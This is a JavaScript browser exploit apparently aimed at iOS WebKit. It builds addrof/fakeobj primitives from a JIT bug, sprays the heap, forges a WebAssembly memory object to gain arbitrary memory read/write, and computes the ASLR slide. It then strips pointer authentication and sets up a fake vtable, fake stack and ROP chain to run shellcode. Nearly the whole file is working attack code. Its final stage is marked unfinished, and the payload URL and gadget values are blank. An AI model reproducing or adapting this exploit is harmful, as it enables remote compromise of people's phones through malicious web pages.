using('liblogging');
using('libint64');
using('libbinhelper');

// Length of our shellcode
var shellcode_length = 0;

// Exported offsets global
_off = {};

/* 
    Exploit Configuration Settings 
*/
var YES = true; var NO = false;
var CONFIG = {
	PAYLOAD: {
		MAX_SIZE: 0x1000000,
		URL: ""
	},
	MEMDUMP: {
		SIZE: 0,
		PADDING: 16,
		ENABLED: NO
	},
	RESPRING: {
		ENABLED: NO,
		REBOOT: NO
	},
	INTEGRITY_CHECKS: {
		ENABLED: NO,
		ALLOW_FAIL: YES
	},
	VERBOSITY: VERBOSITY.VERBOSE
};


/*
 * Shellcode buffer
 */
var BASE32 = 0x100000000;
var workbuf = new ArrayBuffer(0x1000000); // Buffer to use for storing our shellcode

/*
  Spectre is a bug in CPU implementations of branch prediction.
  On newer iOS this is mitigated and therefore js objects are bigger so we detect whether spectre has been mitigated.
  As spectre can be exploited through a SharedArrayBuffer, browsers post-spectre have removed the feature which we will use to detect the mitigations.
*/
var spectre = (typeof SharedArrayBuffer !== 'undefined'); 
var FPO = spectre ? 0x18 : 0x10; // As mentioned above, spectre mitigation related offset differences.

/*
 * For converting integers
*/
var conversion_buffer = new ArrayBuffer(8);
var f64 = new Float64Array(conversion_buffer);
var f32 = new Float32Array(conversion_buffer);
var i32 = new Uint32Array(conversion_buffer);
var i16 = new Uint16Array(conversion_buffer);
var i8 = new Uint8Array(conversion_buffer);

/* 
 * For convenience we have conversion buffers (typedArrays) using our 'shared' workbuffer.
 * The workbuffer is the buffer where we will write our shellcode in.
 * This buffer will need to be jitMemCpy'd to an executable MemoryPool otherwise it will not be executable.
*/
var f32_buffer = new Float32Array(workbuf);
var f64_buffer = new Float64Array(workbuf);
var u32_buffer = new Uint32Array(workbuf);
var u16_buffer = new Uint16Array(workbuf);
var u8_buffer = new Uint8Array(workbuf);
var i32_buffer = new Int32Array(workbuf);
var i16_buffer = new Int16Array(workbuf);
var i8_buffer = new Int8Array(workbuf);

/// START_GENERIC_FUNCTIONS
/*
 * Generic functions need to be used for bitwise operations and conversion
*/

/*
 * Function for performing exclusive OR operation
*/
var xor = function(a, b)
{
	//result and base
	var res = 0, base = 1;

	//Perform the exclusive OR
	for(var i = 0; i < 64; ++i)
	{
		res += base * ((a&1) ^(b&1));
		a = (a-(a&1))/2;
		b = (b-(b&1))/2;
		base *= 2;
	}
	return res;
};

/*
 * Function for converting hex to string
*/
var x2a = function(hex)
{
	var u8 = new Uint8Array(Math.ceil(hex.length / 2)); //convert the string to bytes
	
	//Parse the entire array as hex
	for(var i = 0; i < u8.length; i++)
	{
		u8[i] = parseInt(hex.substr(i * 2, 2), 16);
	}

	return new TextDecoder().decode(u8); //convert the uint8 array to a string
};

/*
 * Functions for converting from/to float from/to int32
*/
function f2i(f) {
    f64[0] = f;
    return i32[0] + BASE32 * i32[1];
}
function i2f(i) {
    i32[0] = i % BASE32;
    i32[1] = i / BASE32;
    return f64[0];
}

/* 
 * Functions for dealing with hex / dec and calculating the ASLR slide.
*/

// Calculate the dynamic library cache slide using a static offset from the cache and a leaked pointer.
var dyld_cache_slide = function(addr_off = 0, addr_leak = 0)
{

		if(!addr_off || !addr_leak) // Input sanitizing
		{
			return;
		} 

		if(typeof dyld_cache_slide !== 'function') // No more need to perform any logic, we already are the cache slide
		{
			return dyld_cache_slide;
		}

		// Use the provided offset and leaked address to calculate the dyld_cache_slide
		// Note that this only works with addresses in the shared_cache and valid matching static offsets
		dyld_cache_slide = function()
		{
			return parseInt(addr_off - addr_leak) === NaN ? 0 : parseInt(addr_off - addr_leak);
		};
};

// Get a slid address
var slideaddr = function(addr)
{

	return addr + dyld_cache_slide();
};

// Get the unslid address
var unslideaddr = function(addr)
{

	return addr - dyld_cache_slide();
};

// Get hex value of a decimal
var hexify = function(intval = 0)
{
	
	if(typeof intval !== 'number' || intval < 0)
	{
		intval = 0;
	}
	return '0x'+parseInt(intval).toString(16);
};

// Get decimal value of a hex value
var decify = function(hexval = '')
{

	if(typeof hexval !== 'string')
	{
		return 0;
	}

	if(hexval[0]+hexval[1] != '0x')
	{
		hexval = '0x'+hexval;
	}

	return parseInt(hexval); 
};


/* Our exploit uses a binhelper.
 * Therefore we register a global one
*/
var bh = new BinHelper();

/*
 * A persistantwriter is used to store logs so that they can be retrieved at next page load.
 * This way in terms of our exploit, we can make sure we see what went wrong or right.
*/
var persistantwriter = function()
{
    this.log = '';
    this.supported = function(){
        if(window.location.href.split('file://').length == 1) { //we check if the url does not contain file:// (1 = not contains, 2 = contains) this because localStorage is prohibited in local files
            if(localStorage){ //check if the browser supports localstorage
                return true;
            }
        }
        return false;
    }();
};
persistantwriter.prototype.read = function()
{
    if(this.supported) {
        this.log = localStorage.getItem('log') || ''; //try to read the last log from localstorage
    }
    return this.log;
};
persistantwriter.prototype.write = function(msg = '')
{
    var newline = '<br>'; //memory efficiency, as it's referenced instead of seperately allocated

    this.read(); //update log with old log

    this.log += Date.now()+":"+newline+msg+newline+newline; //write new log line

    if(this.supported) {
        localStorage.setItem('log', this.log); //save new log into persistancy
    }
};
persistantwriter.prototype.readfrom = function(key = '')
{
    if(this.supported){
        return localStorage.getItem(key);
    }
};
persistantwriter.prototype.writeto = function(key = '', value = null)
{
    if(this.supported){
        localStorage.setItem(key, value);
    }
};
persistantwriter.prototype.clear = function()
{
    this.log = '';
    if(this.supported) localStorage.clear();
};
persistantwriter.prototype.clearAt = function(key = '')
{

    if(this.supported) {
    	localStorage.setItem(key, undefined);
    }
};

/*
 * Our exploit uses a persistantwriter.
 * Therefore we register a global one.
*/
var pwr = new persistantwriter();

/*
 * As we implement on the liblogging we can overwrite print and use puts.
 * Since we do have a persistantwriter globally we also write to the persistant log when calling print.
 * If we are writing to an html element with puts we make sure that newlines are replaced with HTML breaks.
*/
print = function(msg, popup = true) {
    pwr.write(msg+'\n');
    if(popup) alert(msg);
    puts(msg.replace(/\n/g, "<br>"));
};
/// END_OF_GENERIC_FUNCTIONS

/// START_OF_EXPLOIT_UTILS

/*
 * We may want to check the integrity of our shellcode.
 * This is to prevent an attacker from replacing it and to verify our shellcode was downloaded correctly.
 * However, this is not an actual 'secure' method, it is mainly here for verification purposes.
*/
function check_integrity(buffer){

    function gethashes(str)
    {
        return { //All hashing algorithms are imported from libcrypto, see code there.
            md5: md5(str),
            sha1: Sha1.hash(str),
            sha256: sha512_256(str),
            sha384: sha384(str),
            sha512: sha512(str)
        };

    };

    //In case we enabled integrity checks we will compare the hashes
    if(CONFIG.INTEGRITY_CHECKS_ENABLED) 
    {
        var shellcode_data = new Uint8Array(buffer);
        var shellcode_hashes = gethashes(shellcode_data.join(''));

        if(
            shellcode_hashes.md5 !== "ea21cf2e6a39ed1ff842d719ec9f3396" || 
            shellcode_hashes.sha1 !== "162d54f4f9214fb8c8099b48cc97a60543220e1c" ||
            shellcode_hashes.sha256 !== "e00592b23afda7aeb7ee6ec7baf8b2b70d64b1110d26b31921c50003378fdc2b" ||
            shellcode_hashes.sha384 !== "72dd7c0573513c0033cf67d8700ed069644a1f3ff4249b0b271a29047ba3b66b0c66f5d31dc16ed54731fc19300e4a50" ||
            shellcode_hashes.sha512 !== "fb2d3b8509f15a57b72574e5c11b11808b7882cf385a41d49344ca7a0e3910c380e9fe7f72b7a8b717780ccb9e847b0cb55686c56f44688a8876ce56aa8403a0"
        )
        {
            throw new Error('Shellcode integrity check failed.');
        }
        else 
        {
            print('Shellcode integrity checks passed!');
        }

    } 
    else 
    {
        print("Hashes: "+ JSON.stringify(gethashes(new Uint8Array(buffer).join(''))));
    }
}

/*
 * Function for converting a string to an arraybuffer
*/
var str2ab = function(str = '')
{

	return new TextEncoder().encode(str).buffer;
};

/*
 * At start these are the only primitives we can use in the exploit.
 * However, the exploit will extend these and/or replace them during the stages of exploitation.
*/
var primitives = {

	// Leaks the address of an object
	addrof: function(obj)
	{
		var _addrof = function(val)
		{
			var array = [13.37];
	    	var reg = /abc/y;
	    
		    function getarray() {
		        return array;
		    }
	    
		    // Target function
		    var AddrGetter = function(array) {
		        for (var i = 2; i < array.length; i++) {
		            if (num % i === 0) {
		                return false;
		            }
		        }
		        
		        array = getarray();
		        reg[Symbol.match](val === null);
		        return array[0];
		    }
	    
		    // Force optimization
		    for (var i = 0; i < 100000; ++i)
		        AddrGetter(array);
	    
		    // Setup haxx
		    regexLastIndex = {};
		    regexLastIndex.toString = function() {
		        array[0] = val;
		        return "0";
		    };
	    	reg.lastIndex = regexLastIndex;
	    
		    // Do it!
		    return AddrGetter(array);
		};

		for(i = 0; i < 100; i++)
		{
			var r = _addrof(obj);
			if(typeof r != "object" && r !== 13.37)
			{
				return r;
			}
		}
		print("[-] Addrof didn't work. Prepare for WebContent to crash or other strange stuff to happen...");
		window.location.reload();
	},

	// Fakes anything to be an object we can operate on
	fakeobj: function(val)
	{
		function _fakeobj(val) {
		    var array = [13.37];
		    var reg = /abc/y;
		    
		    function getarray() {
		        return array;
		    }
		    
		    // Target function
		    var ObjFaker = function(array) {
		        for (var i = 2; i < array.length; i++) {
		            if (num % i === 0) {
		                return false;
		            }
		        }
		        
		        array = getarray();
		        reg[Symbol.match](val === null);
		        array[0] = val;
		    }
		    
		    // Force optimization
		    for (var i = 0; i < 100000; ++i)
		        ObjFaker(array);
		    
		    // Setup haxx
		    regexLastIndex = {};
		    regexLastIndex.toString = function() {
		        array[0] = {};
		        return "0";
		    };
		    reg.lastIndex = regexLastIndex;
		    
		    // Do it!
		    var unused = ObjFaker(array);
		    
		    return array[0];
		}
		for (var i = 0; i < 1000; i++) {
	    	var result = _fakeobj(val);
	   		if (typeof result == "object"){
	        	return result;
	    	}
		}
	}
};

/*
 * JIT'ed function creation
 * This is so that we will end up with a function we can use to get the executable jitregion
*/
function makejitfunc()
{
	// Some code to avoid inlining...
	function target(num) {
    	for (var i = 2; i < num; i++) {
        	if (num % i === 0) {
            	return false;
        	}
    	}
    	return true;
	}

    // Force JIT compilation.
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    return target;
};

var millis = function(ms)
{
	var t1 = Date.now();
    while(Date.now() - t1 < ms)
    {
    	//Simply wait
    }
};

/// END_OF_EXPLOIT_UTILS

/// START_OF_EXPLOIT
var stage1 = function()
{
	// Spray Float64Array structures so that structure ID 0x5000 will
    // be a Float64Array with very high probability
    // We spray Float64Array first because it's faster

    var structs = [];
    for (var i = 0; i < 0x5000; i++) {
        var a = new Float64Array(1);
        a['prop' + i] = 1337;
        structs.push(a);
    }

    // Now spray WebAssembly.Memory
    for (var i = 0; i < 50; i++) {
        var a = new WebAssembly.Memory({inital: 0});
        a['prop' + i] = 1337;
        structs.push(a);
    }
    
   	// Our WASM module code
    var webAssemblyCode = '\x00asm\x01\x00\x00\x00\x01\x0b\x02`\x01\x7f\x01\x7f`\x02\x7f\x7f\x00\x02\x10\x01\x07imports\x03mem\x02\x00\x02\x03\x07\x06\x00\x01\x00\x01\x00\x01\x07D\x06\x08read_i32\x00\x00\twrite_i32\x00\x01\x08read_i16\x00\x02\twrite_i16\x00\x03\x07read_i8\x00\x04\x08write_i8\x00\x05\nF\x06\x0b\x00 \x00A\x04l(\x02\x00\x0f\x0b\x0c\x00 \x00A\x04l \x016\x02\x00\x0b\x0b\x00 \x00A\x02l/\x01\x00\x0f\x0b\x0c\x00 \x00A\x02l \x01;\x01\x00\x0b\x08\x00 \x00-\x00\x00\x0f\x0b\t\x00 \x00 \x01:\x00\x00\x0b';
   
   	// Convert the module to an arraybuffer
    var webAssemblyBuffer = str2ab(webAssemblyCode);

    //Assemble the Wasm module
    var webAssemblyModule = new WebAssembly.Module(webAssemblyBuffer);
    
    // Setup container to host the fake Wasm Memory Object
    var jsCellHeader = new Int64([
        0x00, 0x50, 0x00, 0x00, // m_structureID
        0x0,                    // m_indexingType
        0x2c,                   // m_type
        0x08,                   // m_flags
        0x1                     // m_cellState
    ]);
    
    var wasmBuffer = {
        jsCellHeader: jsCellHeader.asJSValue(),
        butterfly: null,
        vector: null,
        memory: null,
        deleteMe: null
    };
    
    var wasmInternalMemory = {
        jsCellHeader: null,
        memoryToRead: {}, 
        sizeToRead: (new Int64('0x0FFFFFFFFFFFFFFF')).asJSValue(), // Something large enough
        size: (new Int64('0x0FFFFFFFFFFFFFFF')).asJSValue(), // Something large enough
        initialSize: (new Int64('0x0FFFFFFFFFFFFFFF')).asJSValue(), // Something large enough
        junk1: null,
        junk2: null,
        junk3: null,
        junk4: null,
        junk5: null,
    };
    
    var leaker = {
        objectToLeak: null
    };
    
    // I want 0s here ;)
    delete wasmBuffer.butterfly;
    delete wasmBuffer.vector;
    delete wasmBuffer.deleteMe;
    delete wasmInternalMemory.junk1;
    delete wasmInternalMemory.junk2;
    delete wasmInternalMemory.junk3;
    delete wasmInternalMemory.junk4;
    delete wasmInternalMemory.junk5;

    // We'll need this one later
    var realWasmMem = new WebAssembly.Memory({inital: 0x1});

    var wasmBufferRawAddr = primitives.addrof(wasmBuffer);
    var wasmBufferAddr = Add(Int64.fromDouble(wasmBufferRawAddr), 16);
    print("[+] Fake Wasm Memory @ " + wasmBufferAddr);
    var alreadyHacked = function(){
    	var p = wasmBufferAddr.toString().split();
    	if(p[2]+p[3]+p[4] == '41f') //0 and 1 are 0x, so we skip these bits
    	{
    		return true;
    	}
    	else 
    	{
    		return false;
    	}
    }();
    if(alreadyHacked)
    {
    	print("[+] Detected leftover from previous exploit, page will be refreshed.");
    	window.location.reload();
    }
    var fakeWasmBuffer = primitives.fakeobj(wasmBufferAddr.asDouble());
    
    while (!(fakeWasmBuffer instanceof WebAssembly.Memory)) {
        jsCellHeader.assignAdd(jsCellHeader, Int64.One);
        wasmBuffer.jsCellHeader = jsCellHeader.asJSValue();
    }
    
    
    
    //
    // BEGIN CRITICAL SECTION
    // 
    // GCing now would cause a crash...
    //

    var wasmMemRawAddr = primitives.addrof(wasmInternalMemory);
    var wasmMemAddr = Add(Int64.fromDouble(wasmMemRawAddr), 16);
    print("[+] Fake Wasm Internal Memory @ " + wasmMemAddr);
    var wasmMem = primitives.fakeobj(wasmMemAddr.asDouble());
    
    wasmBuffer.memory = wasmMem;
    
    var importObject = {
        imports: {
            mem: fakeWasmBuffer
        }
    };

	// For reading and writing 64 bit integers, we use int16 because 32 bit integers are weird in javascript (sign bit)
    function read_i64(readingFunc, offset) {
        var low = readingFunc(offset * 4);
        var midLow = readingFunc((offset * 4) + 1);
        var midHigh = readingFunc((offset * 4) + 2);
        var high = readingFunc((offset * 4) + 3);
        return Add(ShiftLeft(Add(ShiftLeft(Add(ShiftLeft(high, 2), midHigh), 2), midLow), 2), low);
    }
    
    function write_i64(writingFunc, offset, value) {
        writingFunc(offset * 4, ShiftRight(value, 0).asInt16());
        writingFunc((offset * 4) + 1, ShiftRight(value, 2).asInt16());
        writingFunc((offset * 4) + 2, ShiftRight(value, 4).asInt16());
        writingFunc((offset * 4) + 3, ShiftRight(value, 6).asInt16());
    }
    
    // Create writer from Object
    function createObjWriter(obj) {
        wasmInternalMemory.memoryToRead = obj;
        var module = new WebAssembly.Instance(webAssemblyModule, importObject);
        return {read_i8: module.exports.read_i8, write_i8: module.exports.write_i8, read_i16: module.exports.read_i16, write_i16: module.exports.write_i16, read_i32: module.exports.read_i32, write_i32: module.exports.write_i32, read_i64: read_i64.bind(null, module.exports.read_i16), write_i64: write_i64.bind(null, module.exports.write_i16), module: module}
    }
    
    var fakeWasmInternalBufferWriter = createObjWriter(wasmMem);
    var wasmInternalBufferWriter = fakeWasmInternalBufferWriter;
    
    // Create writer from address
    function createDirectWriter(address) {
        wasmInternalBufferWriter.write_i64(1, address);
        var module = new WebAssembly.Instance(webAssemblyModule, importObject);
        return {read_i8: module.exports.read_i8, write_i8: module.exports.write_i8, read_i16: module.exports.read_i16, write_i16: module.exports.write_i16, read_i32: module.exports.read_i32, write_i32: module.exports.write_i32, read_i64: read_i64.bind(null, module.exports.read_i16), write_i64: write_i64.bind(null, module.exports.write_i16), module: module}
    }
    
    // Now edit our real Wasm memory
    var realWasmWriter = createObjWriter(realWasmMem);
    var realWasmInternalMemAddr = realWasmWriter.read_i64(3);
    print("[+] Real Wasm Internal Memory @ " + realWasmInternalMemAddr);
    wasmInternalBufferWriter = createDirectWriter(realWasmInternalMemAddr);
    
    // Create an object leaker
    var leakerWriter = createObjWriter(leaker);
    
    // Set sizes to large values
    wasmInternalBufferWriter.write_i64(2, new Int64('0x0FFFFFFFFFFFFFFF'));
    wasmInternalBufferWriter.write_i64(3, new Int64('0x0FFFFFFFFFFFFFFF'));
    wasmInternalBufferWriter.write_i64(4, new Int64('0x0FFFFFFFFFFFFFFF'));
    var realInternalBufferAddr = wasmInternalBufferWriter.read_i64(1);
    importObject.imports.mem = realWasmMem;

    window.primitives.addrof = function(obj) {
        leaker.objectToLeak = obj;
        return leakerWriter.read_i64(2);
    };

    window.primitives.fakeobj = function(addr) {
        leakerWriter.write_i64(2, addr);
        return leaker.objectToLeak;
    };


    // And createObjWriter
    primitives.createObjWriter = function(obj) 
    {

       	return createDirectWriter(primitives.addrof(obj));
    };

    print("[+] Cleaning up stage 1, this may take a while.");

    var writer = primitives.createObjWriter(wasmMem);
    writer.write_i64(0, Int64.One);

    var wasmBufferWriter = primitives.createObjWriter(wasmBuffer);
    var writer = primitives.createObjWriter(wasmInternalMemory);

    wasmBufferWriter.write_i64(0, new Int64('0x0000000000000007')); // Don't know why this works, lol
    wasmBufferWriter.write_i64(2, new Int64('0x0000000000000007'));
    
    writer.write_i64(4, Int64.Zero);
    writer.write_i64(5, Int64.Zero);
    writer.write_i64(6, Int64.Zero);
    writer.write_i64(7, Int64.Zero);
    writer.write_i64(0, new Int64('0x0000000000000007'));
    writer.write_i64(2, new Int64('0x0000000000000007'));

   	//Wait for GC to finish
   	millis(1000);

    //
    // END CRITICAL SECTION
    // 
    // The Garbage Collector may now continue to run
    //

    print("[+] Crafting primitives for stage2.");
    primitives.create_writer = function(addrObj) {
        if (addrObj instanceof Int64) {
            var writer = createDirectWriter(addrObj);
            return writer;
        } else {
            var writer = createObjWriter(addrObj);
            return writer;
        }
    };
    primitives.read_i64 = function(addrObj, offset) {
            var writer = primitives.create_writer(addrObj);
            return writer.read_i64(offset);
    };
    primitives.write_i64 = function(addrObj, offset, value) {
        var writer = primitives.create_writer(addrObj);
        writer.write_i64(offset, value);
    };

    primitives.write_non_zero = function(where, values)
    {
    	for(var i = 0; i < values.length; ++i)
    	{
    		if(values[i] != 0)
    		{
    			primitives.write_i64(Add(where,i*8),0, values[i]);
    		}
    	}
    };

    primitives.read_i32 = function(addrObj, offset) {
        var writer = primitives.create_writer(addrObj);
        return new Int64(writer.read_i32(offset));
    };
    primitives.write_i32 = function(addrObj, offset, value) {
        var writer = primitives.create_writer(addrObj);
        writer.write_i32(offset, value);
    };
    primitives.read_i8 = function(addrObj, offset) {
        var writer = primitives.create_writer(addrObj);
        return writer.read_i8(offset);
    };
    primitives.write_i8 = function(addrObj, offset, value) {
        var writer = primitives.create_writer(addrObj);
        writer.write_i8(offset, value);
    };
    primitives.copyto = function(addrObj, offset, data, length) {
        var writer = primitives.create_writer(addrObj);
        for (var i = 0; i < length; i++) {
            writer.write_i8(offset + i, data[i]);
        }
    };
    primitives.copyfrom = function(addrObj, offset, length) {
        var writer = primitives.create_writer(addrObj);
        var arr = new Uint8Array(length);
        for (var i = 0; i < length; i++) {
            arr[i] = writer.read_i8(offset + i);
        }
        return arr;
    };
    print("[+] Got stable Memory R/W");
    window.primitives = primitives;
    millis(100);
};


var stage2 = function()
{

	/*
	 * Strip the Pointer Authentication Code from an address.
	*/
    primitives.strippac = function(addr)
    {
		/*
		 * Function to see if the device has Control Flow Integrity (A12+)
		*/
    	var hasPAC = function() {
	        var sinFuncAddr = primitives.addrof(Math.sin);
	        var executableAddr = primitives.read_i64(sinFuncAddr, 3);
	        var jitCodeAddr = primitives.read_i64(executableAddr, 3);
	        var rxMemAddr = primitives.read_i64(jitCodeAddr, 4);
	        if (ShiftRight(rxMemAddr, 5) == 0) {
	            return false; //iOS Pointer from Shared Library cache without PAC
	        }
	        return true; // Must have PAC then, right?
	    };

    	var _pac = hasPAC();
    	_pac ? print("[+] Detected device with CFI.") : print("[+] Detected device without CFI.");
    	return _pac ? And(addr, new Int64('0xFFFFFFFF8')) : addr;
    };


    function getjitfunc(rwx)
    {
	    var shf = makejitfunc(); // Get a function that has been assigned executable jitregion

	    // Leak the address of the function
	    var shf_addr = primitives.addrof(shf);
	    print("[+] Shellcode function @ " + shf_addr);

	    // Now read from that address +3 to find the executable instance of that function
	    var shfx_addr = primitives.read_i64(shf_addr, 3);
	    print("[+] Executable instance @ "+ shfx_addr);
	    
	    // We want to know where the JITCode is at, so again read at the address +3 of the executable instance
	    var shfc_addr = primitives.read_i64(shfx_addr, 3);
	    print("[+] JITCode instance @ " + shfc_addr);
	
		// Our final goal was to find the executable region which we find by reading at the JITCode instance +4 
		// Executable regions in JIT are poisoned, but we don't need to unpoison the address anyway
	    var shf_xregion = primitives.read_i64(shfc_addr, 4);

	    // Lets see if we are dealing with an A12 device that has control flow integrity
	    // If we have control flow integrity we will find that when shifting 5 bits to the right there is a value instead of 0.
	    // That means we need to strip the Pointer Authentication Code from the address, no big deal

	    shf_xregion = primitives.strippac(shf_xregion);
	    print("[+] Executable region @ " + shf_xregion);

	 
	   
	    return [shf, shfc_addr, shf_xregion];
	};

	var shf = getjitfunc(); //At this point, our payload should have been executed. (But not today as it is unfinished work).

	// This element is the element we target for leaking randomization and execution
	var wrapper = document.createElement('div');
	var el = primitives.read_i64(wrapper, FPO);
    print("Element @ 0x" + el);

    // We will leak the vtable of the element so that we can calculate the shared cache randomization slide
    var nativejitcode = primitives.read_i64(el, 0);
    print("[+] Got nativejitcode @ "+nativejitcode);

    // We can determine the address space randomization slide by simply diffing vtable offset against leaked vtable
    var slide = nativejitcode - _off.nativejitcode;
    print("[+] Slide: "+ hexify(slide));
    dyld_cache_slide(nativejitcode, _off.nativejitcode);

    // iOS devices with a processor pre-A12 use jitWriteSeperateHeapsFunction in the special jitMemCpy
    var jitWriteSeparateHeapsFunctionAddr = slideaddr(_off.jit_writeseperateheaps_func);
    var jitWriteSeparateHeapsFunction =primitives.read_i64(jitWriteSeparateHeapsFunctionAddr);

    // iOS devices with a A12 processor and newer use useFastPermissionsJITCopy in the special jitMemCpy
    var useFastPermisionsJITCopyAddr = slideaddr(_off.usefastpermissions_jitcopy);
    var useFastPermisionsJITCopy = primitives.read_i64(useFastPermisionsJITCopyAddr);

    // We will determine which of the jitMemCpy methods is enforced
    if (!useFastPermisionsJITCopy || jitWriteSeparateHeapsFunction) 
    {
    	print("[+] Got an older device. We can use the legacy execution flow.");
    }
    else
    {
    	print("[+] Got an iPhone 8 or up. We must use the modern execution flow.");
    }

    // We want to jitMemCpy our shellcode into the executable memorypool
   	print("[+] Finding the executable memorypool.");
    var startOfFixedExecutableMemoryPool = primitives.read_i64(slideaddr(_off.startfixedmempool), 4);
    var endOfFixedExecutableMemoryPool = primitives.read_i64(slideaddr(_off.endfixedmempool), 4);

    // Leak the JavaScriptbase
    var jscbase = slideaddr(_off.jscbase);

    print("[+] Calculating shared cache base.");
    var shared_cache = slideaddr(_off.dyld_shared_cache);
    print("[+] Retrieving magic.");
    var scache_magic = primitives.read_i64(shared_cache, 0);
    print("[+] Got shared cache at "+hexify(shared_cache)+" magic: "+scache_magic);

    // These offsets are needed for our ROP based mach-o loader and jitMemCpy
    var disablePrimitiveGigacage = slideaddr(_off.disableprimitivegigacage);

	print("[+] Finding the callback vector");
    var callbacks = primitives.read_i64(slideaddr(_off.callbacks), 0);
   
    var g_gigacageBasePtrs = slideaddr(_off.g_gigacagebaseptrs);
    var g_typedArrayPoisons = slideaddr(_off.g_jsarraybufferpoison);
    var longjmp = slideaddr(_off.longjmp);
    var dlsym = slideaddr(_off.dlsym);
    var ptr_stack_chk_guard = slideaddr(_off.ptr_stack_check_guard);




    
    print("[+] Finding array poison value");
    var poison = 0;
    if(g_typedArrayPoisons)
    {
    	poison = primitives.read_i64(g_typedArrayPoisons, 48);
    }
    print("[+] poison:"+ poison);


    // see jitcode.s (stage3)
    // This gadget is basically for loading our mach-o
    // It is used in logic where the loader mimics as if dyld was invoked from kernel
    // However, stage3 by Luca Todesco is officially closed-source
    var linkcode_gadget = slideaddr(_off.linkcode_gadget);

    print(''
        + '\nASLR Slide ' + hexify(slide) //dyld shared cache slide should be equal to the vtable infoleak minus the vtable offset
        + '\nJavaScriptCore base @ ' + (jscbase == slide ? "Offset missing" : hexify(jscbase))
        + '\ncallbacks @ ' + (callbacks == slide ? "Offset missing" : hexify(callbacks)) //callback vector
        + '\nlongjmp @ ' + (longjmp == slide ? "Offset missing" : hexify(longjmp)) //symbol
        + '\ndlsym @ ' + (dlsym == slide ? "Offset missing" : hexify(dlsym)) //dlsym symbol, used for referincing a symbol by string
        + '\ndisablePrimitiveGigacage @ ' + (disablePrimitiveGigacage == slide ? "Offset missing" : hexify(disablePrimitiveGigacage)) //symbol
        + '\ng_gigacageBasePtrs @ ' + (g_gigacageBasePtrs == slide ? "Offset missing" : hexify(g_gigacageBasePtrs)) //symbol
        + '\nlinkCode gadget @ ' + (linkcode_gadget == slide ? "Offset missing" : hexify(linkcode_gadget)) //symbol, used in stage2
        + '\njit_writeseperateheaps_func @ ' + (jitWriteSeparateHeapsFunctionAddr == slide ? "Offset missing" : hexify(jitWriteSeparateHeapsFunctionAddr))
        + '\nuseFastPermisionsJITCopy @ ' +  (useFastPermisionsJITCopyAddr == slide ? "Offset missing" : hexify(useFastPermisionsJITCopyAddr))
        + '\nstartfixedmempool @ ' + (startOfFixedExecutableMemoryPool == slide ? "Offset missing" : startOfFixedExecutableMemoryPool)
        + '\nendfixedmempool @ ' + (endOfFixedExecutableMemoryPool == slide ? "Offset missing" : endOfFixedExecutableMemoryPool)
        + '\nptr_stack_check_guard @ ' + (ptr_stack_chk_guard == slide ? "Offset missing" : hexify(ptr_stack_chk_guard))
    );

   	// These rop gadget offsets are used for our ROP based mach-o loader but can ofcourse be altered.
	// This gadget is used so that we can get control over stack and fake stack memory

	// ModelIO:0x000000018d2f6564 :
    //   ldr x8, [sp, #0x28]
    //   ldr x0, [x8, #0x18]
    //   ldp x29, x30, [sp, #0x50]
    //   add sp, sp, #0x60
    //   ret
   	var pop_x8 = 0;

   	// CoreAudio:0x000000018409ddbc
    //   ldr x2, [sp, #8]
    //   mov x0, x2
    //   ldp x29, x30, [sp, #0x10]
    //   add sp, sp, #0x20
    //   ret
    var pop_x2 = 0;


    var buffer_addr = primitives.addrof(u32_buffer); // Is this poisoned or am I stupid?
    print("[+] Shellcode buffer @ " +buffer_addr);

    var shellcode_src = Add(buffer_addr,0x4000);
    print("[+] Shellcode @ " + shellcode_src);

    var shellcode_dst = endOfFixedExecutableMemoryPool - 0x1000000;
    print("[+] Shellcode target @ " + hexify(shellcode_dst));

    // Verify that we would actually end up in the executable memorypool.
   	if(shellcode_dst < startOfFixedExecutableMemoryPool) 
   	{
   		print("[+] We can't target any address that is not in the executable memorypool, exploit will fail.");
   	}

    // We need to write dlsym offset at the begin of our shellcode
    // This is to make sure our mach-o will get loaded by dyld
	print("[+] Preparing shellcode with dlsym offset.");
    primitives.write_i64(shellcode_src, 4, dlsym);

    print("[+] Creating fake stack.");
    var fake_stack = [
    	0,
    	shellcode_length, // x2
    	0,

    	pop_x8,

    	0, 0, 0, 0, 0,
    	shellcode_dst, // x8
    	0, 0, 0, 0,
    	primitives.read_i64(ptr_stack_chk_guard) + 0x58,
    	
    	linkcode_gadget,
    	0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
        0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,

        shellcode_dst,

    ];

	// Set up vtable at offset 0
    print("[+] Setting up fake vtable.");
    u32_buffer[0] = longjmp % BASE32;
    u32_buffer[1] = longjmp / BASE32;

    // Set up the fake stack at offset 0x2000
    print("[+] Setting up fake stack in buffer");
    for(var i = 0; i < fake_stack.length; ++i)
    {
    	u32_buffer[0x2000/4 + 2*i] = fake_stack[i] % BASE32
        u32_buffer[0x2000/4 + 2*i+1] = fake_stack[i] / BASE32
    }

    // We will now write our final chain to the element
	print("[+] Crafting ropchain for the element.");
	var ropchain = [
    	buffer_addr, //fake vtable
    	0,
    	shellcode_src, // x21
    	0, 0, 0, 0, 0, 0, 0,
        0, // frame pointer
        pop_x2, // linking register
        0,
        buffer_addr + 0x2000, // stack pointer (will point to our fake stack)
    ];

    // All this simply is, is a write_non_zero
	for(var i = 0; i < ropchain.length-1; i++)
	{
		print('[+] Writing ropchain (' + i + '/' + (ropchain.length - 1) +')');
		if(ropchain[i] != 0)
		{
			primitives.write_i64(el, i, ropchain[i]);
		}
	}
   

    print('[+] Executing our shellcode.');
    millis(100);
    wrapper.addEventListener('click', function(){});

    /*
    print('[+] Replacing executable region address...');
    primitives.write_i64(shf[1], 4, buffer_addr);

    print("[+] Jumping pc...");
 	millis(100);
    shf[0]();
    */
};

var pwn = function()
{
	try {
		print("[+] Starting stage 1.");
		var stable_rw = stage1();
		print("[+] Survived stage 1, starting stage 2.");
		stage2(stable_rw);
		print("[+] Survived stage 2, starting stage 3.");
	}
	catch(ex)
	{
		if(ex.message && ex.stack)
		{
			print(ex.message+'\n'+ex.stack);
		}
	}
};

/// END_OF_EXPLOIT

/* 
 * Straight up heaven we go
 * Packin PACks on the flow
 * We ain't easy we hardcore
 * Writin code when we are bored
 * Keepin them gc paralized
 * Even yo homie will be surprised
 * That we do bugs n zerodays
 * So we can own this goddamn place
